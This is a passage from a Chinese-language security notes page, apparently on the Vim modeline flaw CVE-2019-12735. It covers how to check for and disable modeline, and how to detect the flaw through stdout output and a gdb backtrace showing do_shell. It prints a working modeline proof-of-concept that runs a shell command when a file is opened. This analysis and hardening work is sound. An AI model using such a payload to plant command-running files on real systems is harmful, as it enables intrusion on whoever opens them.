$ vim poc.txt

Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


Press ENTER or type command to cont

</code></pre>

<ul>
<li>安装最新版本的vim</li>
</ul>
<pre><code class="shell"># 安装最新版本的vim
$ sudo apt install vim

# 通过apt-cache 查看已安装的版本 &gt; 2:7.4.1689-3ubuntu1.3
$ apt-cache policy vim
vim:
  Installed: 2:7.4.1689-3ubuntu1.4
  Candidate: 2:7.4.1689-3ubuntu1.4
  ...

# 配置vimrc开启modeline功能
vim ~/.vimrc
i
set modeline
set modelines=5
&lt;ESC&gt;


# 测试效果，未触发漏洞
$ vim poc.txt
:!uname -a||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;
~                                                                      ...                                                                    
~                                                                               
&quot;poc.txt&quot; 1L, 75C  

</code></pre>

<h4 id="_4">配置检查</h4>
<pre><code class="shell"># 检查modeline配置:
$ vim
:verbose set modeline? 
:verbose set modelines?
# 如果显示nomodeline, nomodelines表示没有配置

# 如果配置了，则会显示：

...
～                                                                 
  modeline
        Last set from ~/.vimrc
Press ENTER or type command to continue

...
～
  modelines=5
        Last set from ~/.vimrc
Press ENTER or type command to continue

# 关闭modeline配置
vim ~/.vimrc
删除
set modeline
set modelines=5
添加
set nomodeline
:wq

# 再次检查
$ vim
:verbose set modeline? 

~                                                                     
nomodeline
        Last set from ~/.vimrc
Press ENTER or type command to continue


</code></pre>

<h4 id="poc">poc验证</h4>
<p><strong>读取stdout</strong></p>
<p>代码执行vim打开poc读取stdout根据输出判断(目前的来看，获取vim的输出貌似有些麻烦)</p>
<p>不存在漏洞时重定向stdout: </p>
<pre><code class="shell">$ vim poc.txt &gt;out.txt
Vim: Warning: Output is not to a terminal
$ cat out.txt 
# 内容为空 

</code></pre>

<p>存在漏洞时重定向stdout: </p>
<pre><code class="shell">$ vim poc.txt &gt; out.txt
Vim: Warning: Output is not to a terminal

Press ENTER or type command to continue

$ cat out.txt 
Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


</code></pre>

<p><strong>检查调用栈</strong></p>
<p>类似的，通过代码执行vim打开poc，ptrace调用栈，检查是否有do_shell调用无漏洞时正常打开poc文件后的调用栈：</p>
<pre><code class="shell">gdb-peda$ bt
#0  0x00007fca6f40b5b3 in __select_nocancel ()
#1  0x000000000052a69c in RealWaitForChar (fd=0x0, 
#2  0x000000000052a444 in WaitForCharOrMouse 
#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)
#4  0x0000000000526147 in mch_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#5  0x00000000005c381e in ui_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#6  0x00000000004ad1fe in inchar (buf=0x86c66a &lt;typebuf_init+42&gt; &quot;&quot;, 
#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832
#8  0x00000000004ab07e in vgetc () at getchar.c:1605
#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801
#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, 
#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at 
#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at 
...

</code></pre>

<p>存在漏洞时，打开poc文件后的调用栈，有一个明显的do_shell的调用:</p>
<pre><code class="shell">gdb-peda$ bt
#0  0x00007f4ba14135b3 in __select_nocancel ()
#1  0x000000000052a69c in RealWaitForChar (fd=0x0, 
#2  0x000000000052a444 in WaitForCharOrMouse 
#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)
#4  0x0000000000526147 in mch_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#5  0x00000000005c381e in ui_inchar (buf=0x86c66a &lt;typebuf_init+42&gt; 
#6  0x00000000004ad1fe in inchar (buf=0x86c66a &lt;typebuf_init+42&gt; &quot;&quot;, 
#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832
#8  0x00000000004ab07e in vgetc () at getchar.c:1605
#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801
#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901
#11 0x000000000045ce32 in do_shell (
    cmd=0x15c7ea0 &quot;uname -a||\&quot; vi:fen:fdm=expr:fde=assert_fails(\&quot;source!\\ %\&quot;):fdl=0:fdt=\&quot;&quot;, flags=0x0) at ex_cmds.c:1572
#12 0x000000000045c50c in do_bang (addr_count=0x0, 
#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at 
#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, 
#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, 
#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at 
#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, 
#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at 
#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at 



</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../cve-2019-5736-分析/" class="btn btn-neutral float-right" title="Cve 2019 5736 分析">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2019-12735-分析/" class="btn btn-neutral" title="Cve 2019 12735 分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2019-12735-分析/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../cve-2019-5736-分析/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
